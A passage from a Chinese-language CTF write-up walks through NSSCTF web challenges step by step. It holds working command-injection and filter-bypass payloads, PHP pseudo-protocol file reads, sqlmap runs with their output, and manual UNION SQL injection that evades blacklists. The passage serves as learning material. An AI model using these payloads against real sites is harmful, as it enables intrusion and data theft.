tee命令用于读取标准输入的数据，并将其内容输出成文件。</p><p>管道符号 <code>|</code>（竖线）表示将前一个命令的输出”传递”给下一个命令作为输入。</p><p>開啟hackbar 打出 ? url &#x3D; l\s &#x2F; | tee test.txt , 然後 &#x2F;test.txt 可看見 </p><img src="168505fbf862b1d969ee44775210bd39.png" alt="168505fbf862b1d969ee44775210bd39.png" /><p>有兩個像是flag的東西 a_here_is_a_f1ag  和 flllllaaaaaaggggggg , </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=tac  /flllll\aaaaaaggggggg | tee <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>使用转义符可繞過檢測 </p><p>然後 &#x2F;1.txt 可看見 </p><img src="e96cb7f0490a1c2838e6149640b03463.png" alt="e96cb7f0490a1c2838e6149640b03463.png" /><p>NSSCTF{2b9d7dde-7f03-4a7f-9664-8a623ff22553}</p><h2 id="9-PseudoProtocols"><a href="#9-PseudoProtocols" class="headerlink" title="9. PseudoProtocols"></a>9. PseudoProtocols</h2><p><a href="https://">https://blog.csdn.net/IDHALASHAO/article/details/130368938</a></p><p>PHP伪协议</p><p>可以用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">php</span>:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure><p>以base64encode 形式去輸出</p><img src="24c0e5759f9d1c2eac63161ba8532905.png" alt="24c0e5759f9d1c2eac63161ba8532905.png" /><p>base64 解碼為：</p><img src="5b9d7541f10767a5bbdd79b40a93ee1e.png" alt="5b9d7541f10767a5bbdd79b40a93ee1e.png" /><br/><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>進入後發現php代碼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可知GET  isset(a) (a存在) 和  file_get_contents(a,’r’)要嚴格 &#x3D; ‘I want flag’  , 可以使用phph伪协议 用data:&#x2F;&#x2F;  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure><img src="e3ce167eb017d822d02d41ebc6149ac6.png" alt="e3ce167eb017d822d02d41ebc6149ac6.png" /><p>還可以用base64  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><br/><h2 id="10-ez-ez-php"><a href="#10-ez-ez-php" class="headerlink" title="10.ez_ez_php"></a>10.ez_ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>試一試&#x2F;flag.php</p><img src="7a7b62c2eb2672dca08985e521a0a057.png" alt="7a7b62c2eb2672dca08985e521a0a057.png" /><p>看來要用php伪协议</p><br/><p>php伪协议</p><p>php:&#x2F;&#x2F;filter&#x2F;<br>读取包含php代码文件内容需要进行某种编码进行输出，不然会当作php代码执行就无法查看文章内容</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>allow_url_fopen ：off&#x2F;on</li><li>allow_url_include：off&#x2F;on</li></ul><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file</span><br></pre></td></tr></table></figure><h5 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h5><ul><li><strong>php:&#x2F;&#x2F;filter&#x2F;</strong>：这是一个 PHP 的流封装器，用于在读写数据时提供过滤功能。</li><li><strong>read&#x3D;convert.base64-encode&#x2F;</strong>：这里指定了一个过滤器，告诉 PHP 在读取数据之前将其进行 base64 编码。<code>convert.base64-encode</code>是一个 PHP 内置的过滤器，用于将数据转换为 base64 编码</li><li><strong>resource&#x3D;file</strong>：这部分指定了要操作的资源。在这个例子中，<code>file</code>表示我们希望对一个文件进行操作，具体来说是对文件的内容进行 base64 编码读取</li></ul><img src="c8a9a7c8fae6f5aa36de009dc991f1d6.png" alt="c8a9a7c8fae6f5aa36de009dc991f1d6.png" /><img src="7a6c1d02bb09e707d0f779bf765dc29c.png" alt="7a6c1d02bb09e707d0f779bf765dc29c.png" /><p>再改一改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><img src="f1f266d969b3ca0389251ef3162172a4.png" alt="f1f266d969b3ca0389251ef3162172a4.png" /><img src="52bf506872189284081ce70e94020942.png" alt="52bf506872189284081ce70e94020942.png" /><p>NSSCTF{5c686f83-3496-45b9-9d79-58172f39fb9c}</p><h2 id="11-babyRCE"><a href="#11-babyRCE" class="headerlink" title="11.babyRCE"></a>11.babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沒有ls 可以?rce&#x3D;ls  , 如下</p><img src="4881e43a020115d6c69d266df2bd8107.png" alt="4881e43a020115d6c69d266df2bd8107.png" /><p>可是空格被ban了 可惡啊</p><img src="763b8d97fc3c333de1ea22b12041dcb0.png" alt="763b8d97fc3c333de1ea22b12041dcb0.png" /><img src="bcbd7da73f6551422f1dd1948360f09c.png" alt="bcbd7da73f6551422f1dd1948360f09c.png" /><p>看來可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br></pre></td></tr></table></figure><p>过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?rce=rev$IFS./fl\ag.php</span><br></pre></td></tr></table></figure><br/><img src="c7e0c4aa074493852c4e0de14d3b553b.png" alt="c7e0c4aa074493852c4e0de14d3b553b.png" /><p>rev一下</p><img src="e5a233ee9fed1a3a5c01044d94537910.png" alt="e5a233ee9fed1a3a5c01044d94537910.png" /><p>NSSCTF{0b67ab0f-36eb-4b7a-b2ec-bcd591f56063}</p><h2 id="12-导弹迷踪"><a href="#12-导弹迷踪" class="headerlink" title="12.导弹迷踪"></a>12.导弹迷踪</h2><p>這不實力嗎(bushi~~</p><img src="070744670c7f9ac8af4b8a37ae9fd54b.png" alt="070744670c7f9ac8af4b8a37ae9fd54b.png" /><p>看看有沒有向服務器發包 ,好像沒有</p><img src="dd7b995b2302fc8d981a9b95889b9b1d.png" alt="dd7b995b2302fc8d981a9b95889b9b1d.png" /><p>說明不能抓包, 只好看看源代碼了, 最後在game.js找到了</p><img src="0a28277e0d4d5d864a3648198b845b02.png" alt="0a28277e0d4d5d864a3648198b845b02.png" /><h2 id="13-caidao"><a href="#13-caidao" class="headerlink" title="13.caidao"></a>13.caidao</h2><p>一看就知道是fuzz了, 蟻劍啟動!!!!! wllm為密碼 </p><p>最後在根目錄找到flag</p><img src="cef146c06300fd3f89926762c4732a48.png" alt="cef146c06300fd3f89926762c4732a48.png" />## 14.easy_sql<p>可以看見參數是wllm 在url?wllm&#x3D;1後</p><img src="eadfa8156d67834230c0e4a0b51fd586.png" alt="eadfa8156d67834230c0e4a0b51fd586.png" /><p>先打開sqlmap ,先查本查是否有注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 3264=3264 AND &#x27;PvdX&#x27;=&#x27;PvdX</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2246 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(2246=2246,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;tWnq&#x27;=&#x27;tWnq</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 5627 FROM (SELECT(SLEEP(5)))KQyT) AND &#x27;LObx&#x27;=&#x27;LObx</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-8611&#x27; UNION ALL SELECT NULL,CONCAT(0x7176766271,0x707a4e734470455a694f714c5377426f56435a6d4447567979594750585254684a71435578684644,0x716b626271),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>用sqlmap爆庫:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>爆table:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --tables --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| test_tb |</span><br><span class="line">| users   |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>看看 test_tb的內容 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --dump --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">Table: test_tb</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| id | flag                                         |</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| 1  | NSSCTF&#123;ca97d725-34c3-4a69-b0b9-21a28907ed9f&#125; |</span><br><span class="line">+----+----------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="15-hardrce"><a href="#15-hardrce" class="headerlink" title="15.hardrce"></a>15.hardrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure><p>可以看到eval($wllm);  是我們的攻擊點 , 目標是eval(system(“ls”)) ; </p><p>注意code 中有blacklist &#x3D; [‘ ‘,’\t’,’\r’,’\n’,’+‘,’[‘,’^‘,’]‘,’&quot;‘,’-‘,’$‘,’*‘,’?‘,’&lt;‘,’&gt;‘,’=‘,’`‘,];</p><p>還不能用英文 preg_match(‘&#x2F;[a-zA-Z]&#x2F;is’,$wllm)</p><p>那我們先打開fuzzshell 生成爆破字典</p><img src="68fc75ee60f78a41d0431d475fd0455f.png" alt="68fc75ee60f78a41d0431d475fd0455f.png" /><p>打開BP去爆破</p><img src="d1ce41419b7f2b6ec5cdbdcf65ede830.png" alt="d1ce41419b7f2b6ec5cdbdcf65ede830.png" /><p>ls 只有index.php  </p><img src="5694fffa82991a04e902a2ea2bb8de50.png" alt="5694fffa82991a04e902a2ea2bb8de50.png" /><p>再看看根目錄 </p><img src="d231317ca11fe1a936d1cd673796df37.png" alt="d231317ca11fe1a936d1cd673796df37.png" /><p>有一個flllllaaaaaaggggggg文件 , 剛剛試了試cd flllllaaaaaaggggggg沒成功 , 應該是txt文件 , 打開fuzzshell system(“cd &#x2F;flllllaaaaaaggggggg”) 去重 </p><img src="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" alt="cf1e259f7cd54ca01b87dd24fd1b7f6a.png" /><p>BP爆破一下 , </p><img src="1ead456a2dd32d44ed0184888a306ec8.png" alt="1ead456a2dd32d44ed0184888a306ec8.png" /><h2 id="16-sql"><a href="#16-sql" class="headerlink" title="16.sql"></a>16.sql</h2><p><a href="http://node4.anna.nssctf.cn:28194/?wllm=1">http://node4.anna.nssctf.cn:28194/?wllm=1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br><span class="line">sqlmap -u http://node4.anna.nssctf.cn:28194/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 4783=4783 AND &#x27;DgVI&#x27;=&#x27;DgVI</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 3858 FROM(SELECT COUNT(*),CONCAT(0x716b716b71,(SELECT (ELT(3858=3858,1))),0x7170766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;jyRE&#x27;=&#x27;jyRE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2372 FROM (SELECT(SLEEP(5)))FzLh) AND &#x27;HGWW&#x27;=&#x27;HGWW</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-4416&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x716b716b71,0x4d46505569644a6c594c556f656e6c726f706b4d484b6c79586c7574617a6e6b6559774368484f61,0x7170766271)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>查找字段数时，提示请勿非法操作</p><img src="94fafbe1a6e373bab66ac9d3f430d7fb.png" alt="94fafbe1a6e373bab66ac9d3f430d7fb.png" /><p>说明空格出现过滤，可以用&#x2F;**&#x2F;绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1%27/**/order/**/by/**/4%23</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>沒有4字段数为3</p> <img src="a4b2b77c2d1027399b7b6be442d414ad.png" alt="a4b2b77c2d1027399b7b6be442d414ad.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><img src="a829ef4366104e99100478c564649d4f.png" alt="a829ef4366104e99100478c564649d4f.png" /><p>看來還有过滤 &#x3D; </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><p>使用like代替&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</span><br></pre></td></tr></table></figure><img src="0541955768dbadf0f5138e3a13144d49.png" alt="0541955768dbadf0f5138e3a13144d49.png" /><p>查看LTLT_flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(%22LTLT_flag%22)%23</span><br></pre></td></tr></table></figure><img src="83ca98ed1f3c834abef68f4562d61d30.png" alt="83ca98ed1f3c834abef68f4562d61d30.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="2370baa6b1f4efac7147c371cfe695f1.png" alt="2370baa6b1f4efac7147c371cfe695f1.png" /><p>flag1 : NSSCTF{cf9ffc45-7a1</p><p>strlen(string)有20個字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p>在group_concat 加一個mid(group_concat(column_name), 起始位置, 长度) </p><p>mid(……..,21,40)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1%27union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="40f96c8eb3a9f9156c397332ae075bcc.png" alt="40f96c8eb3a9f9156c397332ae075bcc.png" /><p>flag2 : 7-4e7a-b6d8-10ff2ead</p><p>41 - 60</p><img src="86120c33fa0c7fbcc9dfe0342d825306.png" alt="86120c33fa0c7fbcc9dfe0342d825306.png" /><p>db58}</p><p>flag : NSSCTF{cf9ffc45-7a17-4e7a-b6d8-10ff2eaddb58}</p><br/><h2 id="17-babyphp"><a href="#17-babyphp" class="headerlink" title="17.babyphp"></a>17.babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span 